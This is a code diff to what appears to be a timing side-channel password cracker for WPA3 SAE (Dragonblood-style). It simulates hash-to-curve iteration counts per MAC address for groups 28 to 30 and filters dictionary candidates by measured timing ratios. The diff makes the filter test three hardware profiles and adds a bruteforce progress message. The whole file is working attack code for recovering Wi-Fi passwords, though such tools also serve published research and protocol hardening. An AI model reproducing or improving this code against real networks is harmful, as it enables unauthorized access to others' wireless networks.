@@ -50,59 +50,58 @@ public:
 		int more_iter = macaddr_lower_var->get_iterations();
 		int less_iter = macaddr_higher_var->get_iterations();
 
-		//printf("\tApplying Variance Filter: %d > %d\n", more_iter, less_iter);
-
 		return more_iter > less_iter;
 	}
+};
+
+struct time_simulation {
+	double time_bighash;
+	double time_qrtest;
 };
 
 class PwFilterAverage : public PwFilter
 {
 private:
+	static double factors28[];
+	static double factors29[];
+	static double factors30[];
 	MacAddrSimulation *macaddr_faster;
 	MacAddrSimulation *macaddr_slower;
 	double pr_toobig;
-	double time_bighash;
-	double time_qrtest;
+	double *factors;
+	int group;
 
-	// TODO: Simulate the time as integers?
-	double simulate_time(MacAddrSimulation *addr)
+	// TODO: Use integers instead of double for higher performance
+	double simulate_time_impl(MacAddrSimulation *addr, int impl)
 	{
 		int num_iterations = addr->get_iterations();
 		int num_hashtoobig = addr->get_hashes_toobig();
 		int remaining = 40 - num_iterations;
 
-		double time_fixed = num_hashtoobig * time_bighash + (num_iterations - num_hashtoobig) * time_qrtest;
-		double time_remaining = remaining * (pr_toobig * time_bighash + (1 - pr_toobig) * time_qrtest);
+		double time_fixed = num_hashtoobig * 1 + (num_iterations - num_hashtoobig) * factors[impl];
+		double time_remaining = remaining * (pr_toobig * 1 + (1 - pr_toobig) * factors[impl]);
 		return time_fixed + time_remaining;
 	}
 
+
 public:
 	PwFilterAverage(MacAddrSimulation *macaddr_slower, MacAddrSimulation *macaddr_faster, int group)
-		: macaddr_faster(macaddr_faster), macaddr_slower(macaddr_slower)
+		: macaddr_faster(macaddr_faster), macaddr_slower(macaddr_slower), group(group)
 	{
-		// TODO: Calculate minimum and maximum bounds, and use those bounds when
-		// filtering results. That way we are independent of the target being attack.
 		switch (group) {
 		case 28:
+			factors = factors28;
 			pr_toobig = 0.3360;
-			// Ratio of 17.41 on work laptop, 16.74 on personal laptop, 23.21 on raspberry 1
-			time_bighash = 4473;
-			time_qrtest = 103812;
 			break;
 
 		case 29:
+			factors = factors29;
 			pr_toobig = 0.4503;
-			// Ratio of 16.17 on work laptop, 15.84 on personal laptop, 25.23 on raspberry 1
-			time_bighash = 8462;
-			time_qrtest = 213493;
 			break;
 
 		case 30:
+			factors = factors30;
 			pr_toobig = 0.3326;
-			// Ratio of 14.33 on work laptop, 18.99 on personal laptop, 46.33 on raspberry 1
-			time_bighash = 8602;
-			time_qrtest = 398505;
 			break;
 
 		default:
@@ -112,19 +111,31 @@ public:
 		}
 	}
 
+	/**
+	 * Returns true if it _could_ be the password.
+	 */
 	virtual bool filter()
 	{
-		//printf("\tApplying Average Filter %02X < %02X\n", macaddr_faster->macaddr[5], macaddr_slower->macaddr[5]);
+		for (int i = 0; i < 3; ++i)
+		{
+			double time_faster = simulate_time_impl(macaddr_faster, i);
+			double time_slower = simulate_time_impl(macaddr_slower, i);
 
-		double time_faster = simulate_time(macaddr_faster);
-		double time_slower = simulate_time(macaddr_slower);
+			// If the measurement allows the password on *some* implementation,
+			// then we do not filter away the password.
+			if (time_faster < time_slower)
+				return true;
+		}
 
-		//printf("\t\t%lf < %lf\n", time_faster, time_slower);
-
-		return time_faster < time_slower;
+		// If the password is invalid on all implementations,
+		// then we filter it away.
+		return false;
 	}
 };
 
+double PwFilterAverage::factors28[] = { 17.41, 16.74, 23.21 }; // Ratio on work laptop
+double PwFilterAverage::factors29[] = { 16.17, 15.84, 25.23 }; // Ratio on personal laptop
+double PwFilterAverage::factors30[] = { 14.33, 18.99, 46.33 }; // Ratio on raspberry pi
 
 
 void MacAddrSimulation::simulate_derivation()
@@ -132,16 +143,9 @@ void MacAddrSimulation::simulate_derivation()
 	if (simulated)
 		return;
 
-	//printf("\tSimulating a MAC address password derivation...\n");
 	this->num_iterations = sae_num_elemtests_ecc(context->ec, context->bssid,
 				this->macaddr, (const uint8_t*)context->password, strlen(context->password),
 				context->pwd_seed, &this->num_hashes_toobig);
-#if 0
-	printf("\t%02X:%02X:%02X:%02X:%02X:%02X - %02X:%02X:%02X:%02X:%02X:%02X => %d/%d\n",
-		context->bssid[0], context->bssid[1], context->bssid[2], context->bssid[3], context->bssid[4], context->bssid[5],
-		this->macaddr[0], this->macaddr[1], this->macaddr[2], this->macaddr[3], this->macaddr[4], this->macaddr[5],
-		this->num_hashes_toobig, this->num_iterations);
-#endif
 
 	simulated = true;
 }
@@ -315,6 +319,8 @@ int PasswordSignature::bruteforce(PasswordList *passwords)
 	int num_possible = 0;
 	const char *pw = passwords->next();
 	int num_checked = 0;
+
+	printf("Bruteforcing %d passwords using group %d\n", passwords->size(), group);
 
 	while (pw != NULL)
 	{
